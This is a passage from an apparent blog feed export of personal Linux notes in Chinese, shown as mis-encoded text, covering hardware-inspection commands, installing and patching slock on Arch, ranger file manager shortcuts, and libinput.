href="#ç”¨ç¡¬ä»¶æ£€æµ‹ç¨‹åº-kuduz-æ¢æµ‹æ–°ç¡¬ä»¶" class="headerlink" title="ç”¨ç¡¬ä»¶æ£€æµ‹ç¨‹åº kuduz æ¢æµ‹æ–°ç¡¬ä»¶"></a>ç”¨ç¡¬ä»¶æ£€æµ‹ç¨‹åº kuduz æ¢æµ‹æ–°ç¡¬ä»¶</h2><h2 id="æŸ¥çœ‹-CPU-ä¿¡æ¯"><a href="#æŸ¥çœ‹-CPU-ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ CPU ä¿¡æ¯"></a>æŸ¥çœ‹ CPU ä¿¡æ¯</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹æ¿å¡ä¿¡æ¯"><a href="#æŸ¥çœ‹æ¿å¡ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æ¿å¡ä¿¡æ¯"></a>æŸ¥çœ‹æ¿å¡ä¿¡æ¯</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>pci<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹-PCI-ä¿¡æ¯"><a href="#æŸ¥çœ‹-PCI-ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ PCI ä¿¡æ¯"></a>æŸ¥çœ‹ PCI ä¿¡æ¯</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">lspci</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹å†…å­˜ä¿¡æ¯"><a href="#æŸ¥çœ‹å†…å­˜ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹å†…å­˜ä¿¡æ¯"></a>æŸ¥çœ‹å†…å­˜ä¿¡æ¯</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/m</span>eminfo<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹-USB-è®¾å¤‡ä¿¡æ¯"><a href="#æŸ¥çœ‹-USB-è®¾å¤‡ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ USB è®¾å¤‡ä¿¡æ¯"></a>æŸ¥çœ‹ USB è®¾å¤‡ä¿¡æ¯</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/usb/</span>devices<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹é¼ æ ‡å’Œé”®ç›˜ä¿¡æ¯"><a href="#æŸ¥çœ‹é¼ æ ‡å’Œé”®ç›˜ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹é¼ æ ‡å’Œé”®ç›˜ä¿¡æ¯"></a>æŸ¥çœ‹é¼ æ ‡å’Œé”®ç›˜ä¿¡æ¯</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/input/</span>devices<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/usb/</span>devices<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯å’Œä½¿ç”¨æƒ…å†µ"><a href="#æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯å’Œä½¿ç”¨æƒ…å†µ" class="headerlink" title="æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯å’Œä½¿ç”¨æƒ…å†µ"></a>æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯å’Œä½¿ç”¨æƒ…å†µ</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">fdisk <span class="hljs-meta">&amp; disk -l &amp; df</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>bus<span class="hljs-regexp">/input/</span>devices<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹å„è®¾å¤‡çš„ä¸­æ–­è¯·æ±‚-IRQ"><a href="#æŸ¥çœ‹å„è®¾å¤‡çš„ä¸­æ–­è¯·æ±‚-IRQ" class="headerlink" title="æŸ¥çœ‹å„è®¾å¤‡çš„ä¸­æ–­è¯·æ±‚ (IRQ)"></a>æŸ¥çœ‹å„è®¾å¤‡çš„ä¸­æ–­è¯·æ±‚ (IRQ)</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/i</span>nterrupts<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">fdisk <span class="hljs-meta">&amp; disk -l &amp; df</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"><a href="#æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"></a>æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/i</span>nterrupts<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹åŒ…æ‹¬-bios-cpu-å†…å­˜ç­‰ä¿¡æ¯"><a href="#æŸ¥çœ‹åŒ…æ‹¬-bios-cpu-å†…å­˜ç­‰ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹åŒ…æ‹¬ bios, cpu, å†…å­˜ç­‰ä¿¡æ¯"></a>æŸ¥çœ‹åŒ…æ‹¬ bios, cpu, å†…å­˜ç­‰ä¿¡æ¯</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dmidecode</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯"><a href="#æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯"></a>æŸ¥çœ‹ç¡¬ä»¶ä¿¡æ¯</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dmesg <span class="hljs-string">| more</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux çš„ç¾åŒ–(ä¸€éƒ¨åˆ†)</title>
    <link href="/2022/09/05/Archlinux-%E7%9A%84%E7%BE%8E%E5%8C%96-%E4%B8%80%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/05/Archlinux-%E7%9A%84%E7%BE%8E%E5%8C%96-%E4%B8%80%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="å®šåˆ¶ç®€æ˜“çš„ç³»ç»ŸçŠ¶æ€æ "><a href="#å®šåˆ¶ç®€æ˜“çš„ç³»ç»ŸçŠ¶æ€æ " class="headerlink" title="å®šåˆ¶ç®€æ˜“çš„ç³»ç»ŸçŠ¶æ€æ "></a>å®šåˆ¶ç®€æ˜“çš„ç³»ç»ŸçŠ¶æ€æ </h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S xsetroot</span><br></code></pre></td></tr></table></figure><p>ä½†è²Œä¼¼æˆ‘å·²ç»å®‰è£…å¥½äº†.</p><h1 id="ç³»ç»ŸéŸ³é‡è°ƒèŠ‚"><a href="#ç³»ç»ŸéŸ³é‡è°ƒèŠ‚" class="headerlink" title="ç³»ç»ŸéŸ³é‡è°ƒèŠ‚"></a>ç³»ç»ŸéŸ³é‡è°ƒèŠ‚</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S alsa-utils</span><br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ amixer æ¥è°ƒèŠ‚.</p><h1 id="è°ƒèŠ‚å±å¹•äº®åº¦"><a href="#è°ƒèŠ‚å±å¹•äº®åº¦" class="headerlink" title="è°ƒèŠ‚å±å¹•äº®åº¦"></a>è°ƒèŠ‚å±å¹•äº®åº¦</h1><p>ç”¨ xbacklight.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Suckless çš„ slock é”å±è½¯ä»¶</title>
    <link href="/2022/09/05/Suckless-%E7%9A%84-slock-%E9%94%81%E5%B1%8F%E8%BD%AF%E4%BB%B6/"/>
    <url>/2022/09/05/Suckless-%E7%9A%84-slock-%E9%94%81%E5%B1%8F%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><a href="http://tools.suckless.org/slock/">Suckless</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>slock æ˜¯ simple X display locker.</p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>å…¶é…ç½®æ–‡ä»¶ä½äº <code>config.h</code>.</p><h1 id="ä½¿ç”¨-Xautolock"><a href="#ä½¿ç”¨-Xautolock" class="headerlink" title="ä½¿ç”¨ Xautolock"></a>ä½¿ç”¨ Xautolock</h1><p>å¯ä»¥ç”¨ xssstate æˆ– xss æ›¿æ¢ã€‚</p><p>slock ä¼šåœ¨ç”¨æˆ·ä¸€æ®µæ—¶é—´æ²¡åŠ¨é™æ—¶è¢« xautolock å¯ç”¨. </p><p>è¯­æ³•æ ¼å¼:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xautolock</span> -time <span class="hljs-number">10</span> -locker slock<br></code></pre></td></tr></table></figure><p>ç›´æ¥è¾“å…¥ <code>slock</code> ä¼šä½¿å±å¹•é”ä½ï¼Œç›´åˆ°ä½ è¾“å…¥å¯†ç .</p><h1 id="slock-getgrnam-nogroup-group-entry-not-found-æŠ¥é”™"><a href="#slock-getgrnam-nogroup-group-entry-not-found-æŠ¥é”™" class="headerlink" title="slock: getgrnam nogroup: group entry not found æŠ¥é”™"></a>slock: getgrnam nogroup: group entry not found æŠ¥é”™</h1><p>å…¶åŸå› ä¸º <code>config.h</code> ä¸­çš„:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> *user = <span class="hljs-string">&quot;nobody&quot;</span>;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> *<span class="hljs-keyword">group</span> = <span class="hljs-string">&quot;nogroup&quot;</span><br></code></pre></td></tr></table></figure><p>å‡ºé”™ã€‚</p><p>åœ¨ Arch ä¸­ï¼Œæ²¡æœ‰æƒé™çš„ group ä»ç„¶ç§°ä¸º <code>nobody</code>, å› æ­¤ï¼ŒæŠŠ <code>nogroup</code> æ”¹ä¸º <code>nobody</code> å°±å¯ä»¥äº†.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å…ˆæ‹‰å–æºä»£ç :</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/slock --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ç›®å½•å:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo make clean <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h1 id="æ‰“è¡¥ä¸"><a href="#æ‰“è¡¥ä¸" class="headerlink" title="æ‰“è¡¥ä¸"></a>æ‰“è¡¥ä¸</h1><h2 id="æ·»åŠ -blured-of-pixelated-screeshot"><a href="#æ·»åŠ -blured-of-pixelated-screeshot" class="headerlink" title="æ·»åŠ  blured of pixelated screeshot"></a>æ·»åŠ  blured of pixelated screeshot</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>tools.suckless.org<span class="hljs-regexp">/slock/</span>patches<span class="hljs-regexp">/blur-pixelated-screen/</span>slock-blur_pixelated_screen-<span class="hljs-number">1.4</span>.diff<br></code></pre></td></tr></table></figure><p>ç„¶å:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">patch</span> &lt; slock-blur_pixelated_screen-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.diff<br></code></pre></td></tr></table></figure><h2 id="æ·»åŠ "><a href="#æ·»åŠ " class="headerlink" title="æ·»åŠ "></a>æ·»åŠ </h2>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch ä¸­å®‰è£… pip</title>
    <link href="/2022/09/05/Arch-%E4%B8%AD%E5%AE%89%E8%A3%85-pip/"/>
    <url>/2022/09/05/Arch-%E4%B8%AD%E5%AE%89%E8%A3%85-pip/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S python-pip</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ranger å·¥å…·çš„å®‰è£…å’Œä½¿ç”¨</title>
    <link href="/2022/09/05/Ranger-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/05/Ranger-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/ranger/ranger">Github ç›¸å…³</a></p><p>åœ¨ github ä¸Šå’Œ archwiki ä¸Šæœ‰å¾ˆå¤šæœ‰ç”¨çš„èµ„æ–™.</p><p>ranger æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œä¸‹çš„æ–‡ä»¶ç®¡ç†å™¨ (file manager).</p><p>å¯ä»¥åœ¨ <code>man ranger</code> å’Œ <code>HACKING.md</code> ä¸­æŸ¥çœ‹ä¿¡æ¯.</p><p>å¯¹äºé…ç½®ï¼Œå¯ä»¥æŸ¥çœ‹ <code>ranger/config/</code> æˆ–è€…å¤åˆ¶é»˜è®¤é…ç½®åˆ° <code>~/.config/ranger</code> with <code>ranger --copy-config</code>.</p><p><code>examples/</code> ä¸­åŒ…å«äº†è„šæœ¬å’Œæ’ä»¶ï¼Œè¿™äº›æ–‡ä»¶å¯ä»¥åœ¨ <code>/usr/share/doc/ranger</code> ä¸­æŸ¥çœ‹ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å…ˆå…‹éš†ä¸‹ä»“åº“:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ranger/</span>ranger.git --depth=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œ:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo make <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>ä½¿ç”¨ <code>h</code> <code>j</code> <code>k</code> <code>l</code> æ¥ navigate.</p><p><code>Enter</code> æ¥æ‰“å¼€æ–‡ä»¶ã€‚</p><p><code>q</code> æ¥é€€å‡º.</p><p>ç¬¬ä¸‰åˆ—ä¼šæ˜¾ç¤º preview of the current file.</p><p>åœ¨ <code>ranger help</code> ä¸­æŸ¥çœ‹æ›´å¤šä¿¡æ¯.</p><h1 id="èµ„æ–™"><a href="#èµ„æ–™" class="headerlink" title="èµ„æ–™"></a>èµ„æ–™</h1><p>å¯ä»¥æŸ¥çœ‹ <code>~/.config/ranger/rc.conf</code> æ–‡ä»¶æ¥çœ‹æœ‰å“ªäº›å¿«æ·é”®.</p><p>ä¿®æ”¹è¿™ä¸ªé…ç½®æ–‡ä»¶å¯ä»¥å®šä¹‰å¾ˆå¤šå¿«æ·é”®.</p><h1 id="éƒ¨åˆ†å¿«æ·é”®"><a href="#éƒ¨åˆ†å¿«æ·é”®" class="headerlink" title="éƒ¨åˆ†å¿«æ·é”®"></a>éƒ¨åˆ†å¿«æ·é”®</h1><p>é‡å‘½å: cw</p><p>ä¿®æ”¹æ–‡ä»¶å: a å’Œ A</p><p>å‰ªåˆ‡ä¸€ä¸ªæ–‡ä»¶: dd  å¤åˆ¶åœ¨å¦ä¸€ä¸ªç›®å½•ä¸‹: pp</p><p>åˆ æ‰ä¸€ä¸ªæ–‡ä»¶: dD</p><p>é€‰ä¸­å¤šä¸ª, ä½¿ç”¨ç©ºæ ¼.</p><p>é€‰ä¸­å…¨éƒ¨, æŒ‰ v.</p><p>bulkrename å‘½ä»¤, åœ¨ vim ä¸‹ä¿®æ”¹æ–‡ä»¶å.</p><p>æ˜¾ç¤ºéšè—æ–‡ä»¶: zh</p><p>æ˜¾ç¤ºæ–‡ä»¶å¤§å°: dU</p><p>æ’åº: o åŠ ä¸€ä¸ªé”®</p><p>å†³å®šæ‰“å¼€æ–¹å¼: r</p><p>ç§»åŠ¨ä¸Šå±‚æ–‡ä»¶å¤¹: [] </p><p>åœ¨å†å²è®°å½•ä¸­è·³è½¬: H L</p><p>è¿›å…¥ ranger æ‰€åœ¨çš„æ–‡ä»¶å¤¹: S</p><p>åˆ©ç”¨ ranger çš„ fzf æ’ä»¶</p><p>å¤åˆ¶æ–‡ä»¶è·¯å¾„: yp</p><p>è¿›å…¥ä»»åŠ¡ç®¡ç†å™¨: w , å–æ¶ˆä»»åŠ¡: dd</p><p>å¯ä»¥å‹ç¼©æ–‡ä»¶: åœ¨ rc.conf ä¸‹æ·»åŠ  <code>map C console compress%space</code></p><p>ä¹Ÿå¯ä»¥è§£å‹ç¼©:åœ¨ rc.conf ä¸‹æ·»åŠ  <code>map X console extracthere%space</code></p><p>å¯å°† md æ–‡ä»¶åˆ¶ä½œæˆ pdf</p><p>å¯ä»¥ä¸‹åœ¨ Youtube è§†é¢‘</p><p>é¢„è§ˆè§†é¢‘</p><p>å¯ä»¥åˆ›å»ºæ–‡ä»¶å¤¹</p><h1 id="å›¾ç‰‡é¢„è§ˆ"><a href="#å›¾ç‰‡é¢„è§ˆ" class="headerlink" title="å›¾ç‰‡é¢„è§ˆ"></a>å›¾ç‰‡é¢„è§ˆ</h1><p>æŸ¥çœ‹ github ä¸Š ranger è‡ªå¸¦çš„ wiki.</p><p>ä½¿ç”¨ ueberzug.</p><p>ä¿®æ”¹ rc.conf ä¸­çš„ image</p><h1 id="è§†é¢‘é¢„è§ˆ"><a href="#è§†é¢‘é¢„è§ˆ" class="headerlink" title="è§†é¢‘é¢„è§ˆ"></a>è§†é¢‘é¢„è§ˆ</h1><p>åœ¨ scope.sh ä¸­æ‰¾ handle_image</p><h1 id="é…ç½®-ranger"><a href="#é…ç½®-ranger" class="headerlink" title="é…ç½® ranger"></a>é…ç½® ranger</h1><h2 id="å„ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨"><a href="#å„ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨" class="headerlink" title="å„ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨"></a>å„ä¸ªé…ç½®æ–‡ä»¶çš„ä½œç”¨</h2><h3 id="commands-py"><a href="#commands-py" class="headerlink" title="commands.py"></a>commands.py</h3><p>å¯ä»¥è‡ªå·±æ·»åŠ å‘½ä»¤å’Œä»£ç . ä¹Ÿå°±æ˜¯å®šä¹‰ ranger çš„å‘½ä»¤.</p><p>wiki ä¸‹é¢çš„ custom command, å¯ä»¥æŠŠè¿™äº›æ·»åŠ åˆ°è¿™ä¸ª <code>commands.py</code> æ–‡ä»¶å†….</p><h3 id="rc-conf"><a href="#rc-conf" class="headerlink" title="rc.conf"></a>rc.conf</h3><p>è¿™ä¸ªæ˜¯ä¸»è¦çš„é…ç½®æ–‡ä»¶</p><p><code>map</code> å‘½ä»¤ç”¨äºæ˜ å°„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">map</span> M cnsole mkcd%space<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>mkcd</code> å°±æ˜¯ <code>commands.py</code> ä¸‹å®šä¹‰çš„å‡½æ•°.</p><p><code>console</code> å°±æ˜¯æ‰§è¡Œä¸€ä¸ª ranger çš„ç»ˆç«¯å‘½ä»¤.</p><p>ä¿®æ”¹ <code>VIM-like</code> å¯ä»¥æ›´æ¢ vim æ“ä½œçš„å¿«æ·é”®.</p><p><code>shell</code> è¡¨ç¤ºåé¢è·Ÿçš„æ˜¯ shell å‘½ä»¤.</p><h4 id="æ˜¾ç¤º-git-çŠ¶æ€"><a href="#æ˜¾ç¤º-git-çŠ¶æ€" class="headerlink" title="æ˜¾ç¤º git çŠ¶æ€"></a>æ˜¾ç¤º git çŠ¶æ€</h4><p>æ‰“å¼€ vcs.</p><h3 id="fifle-conf"><a href="#fifle-conf" class="headerlink" title="fifle.conf"></a>fifle.conf</h3><p>é‡Œé¢ä¿å­˜é»˜è®¤çš„æ‰“å¼€ç¨‹åº, å¦‚æ‰“å¼€ pdf</p><p>å°†é»˜è®¤æ‰“å¼€ç¨‹åºæ¢æˆ nvim:</p><p>å°† <code>$EDITER</code> é‚£ä¸€å¨æ¢æˆ nvim.</p><h3 id="scope-sh"><a href="#scope-sh" class="headerlink" title="scope.sh"></a>scope.sh</h3><p>ä¸é¢„è§ˆç›¸å…³.</p><h2 id="æ’ä»¶çš„å®‰è£…"><a href="#æ’ä»¶çš„å®‰è£…" class="headerlink" title="æ’ä»¶çš„å®‰è£…"></a>æ’ä»¶çš„å®‰è£…</h2><p>åˆ° github çš„ ranger é¡µé¢, è¿›å…¥ wiki ä¸‹çš„ plugins.</p><h3 id="é¢„è§ˆæ–‡ä»¶å›¾æ ‡"><a href="#é¢„è§ˆæ–‡ä»¶å›¾æ ‡" class="headerlink" title="é¢„è§ˆæ–‡ä»¶å›¾æ ‡"></a>é¢„è§ˆæ–‡ä»¶å›¾æ ‡</h3><p>ä¸‹è½½æ’ä»¶ devicons, éœ€è¦ä¾èµ– nerd-fonts</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯ tmux</title>
    <link href="/2022/09/05/%E4%BB%80%E4%B9%88%E6%98%AF-tmux/"/>
    <url>/2022/09/05/%E4%BB%80%E4%B9%88%E6%98%AF-tmux/</url>
    
    <content type="html"><![CDATA[<p>ç»ˆç«¯å¤ç”¨å™¨.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Google å¦‚ä½•æ­æ¢¯å­</title>
    <link href="/2022/09/05/Google-%E5%A6%82%E4%BD%95%E6%90%AD%E6%A2%AF%E5%AD%90/"/>
    <url>/2022/09/05/Google-%E5%A6%82%E4%BD%95%E6%90%AD%E6%A2%AF%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.businessnewsdaily.com/15710-how-to-install-a-vpn-connection.html#what-is-a-vpn">How to Install a VPN Connection</a></p>]]></content>
    
    
    <categories>
      
      <category>CNAA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº PlugInstall å¤±è´¥é—®é¢˜</title>
    <link href="/2022/09/05/%E5%85%B3%E4%BA%8E-PlugInstall-%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/05/%E5%85%B3%E4%BA%8E-PlugInstall-%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>å¤šè¯•å‡ æ¬¡å°±å¯ä»¥å®‰è£…å¥½.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ libinput</title>
    <link href="/2022/09/05/ArchWiki-%E4%B8%AD-libinput/"/>
    <url>/2022/09/05/ArchWiki-%E4%B8%AD-libinput/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Libinput">ArchWiki libinput</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>libinput æ˜¯ä¸€ä¸ªå‡½æ•°åº“ï¼Œåœ¨ Wayland ä¸Šç”¨æ¥æ¥å—è®¾å¤‡çš„è¾“å…¥ï¼Œåœ¨ X.Org ä¸Šæä¾›è¾“å…¥è®¾å¤‡çš„é©±åŠ¨ã€‚å®ƒæä¾›å¯¹è®¾å¤‡äº‹ä»¶çš„æ£€æµ‹å’Œæ¥æ”¶ï¼Œå¯¹è¾“å…¥è®¾å¤‡ä¿¡å·è¿›è¡Œå¤„ç†.</p><p>X.Org è¾“å…¥é©±åŠ¨ä¸ºå¤§å¤šæ•°å¸¸è§„è¾“å…¥è®¾å¤‡æä¾›äº†æ”¯æŒï¼Œlibinput é¡¹ç›®çš„ç›®æ ‡æ˜¯ä¸ºè§¦æ‘¸æ¿å’Œè§¦æ‘¸å±çš„è§¦æ‘¸åŠŸèƒ½æä¾›é«˜çº§æ”¯æŒ.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>åœ¨ Xorg ç³»ç»Ÿä¸­ï¼Œxf86-input-libinput åŒ…æ˜¯é»˜è®¤ä¾èµ–ã€‚</p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>å¯¹äº Xorg, é»˜è®¤çš„é…ç½®æ–‡ä»¶å®‰è£…åœ¨ <code>/usr/share/X11/xorg.conf.d/40-libinput.conf</code>.</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># libinput list-devices</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç³»ç»Ÿä¸­çš„è®¾å¤‡å’Œå®ƒä»¬è¢« libinput æ”¯æŒçš„å…·ä½“ç‰¹æ€§.</p><h2 id="æŸ¥çœ‹æ‰€æœ‰è®¾å¤‡å¹¶ç¡®å®šå…¶åç§°å’Œç¼–å·"><a href="#æŸ¥çœ‹æ‰€æœ‰è®¾å¤‡å¹¶ç¡®å®šå…¶åç§°å’Œç¼–å·" class="headerlink" title="æŸ¥çœ‹æ‰€æœ‰è®¾å¤‡å¹¶ç¡®å®šå…¶åç§°å’Œç¼–å·"></a>æŸ¥çœ‹æ‰€æœ‰è®¾å¤‡å¹¶ç¡®å®šå…¶åç§°å’Œç¼–å·</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>xinput list<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹-device-çš„è®¾ç½®"><a 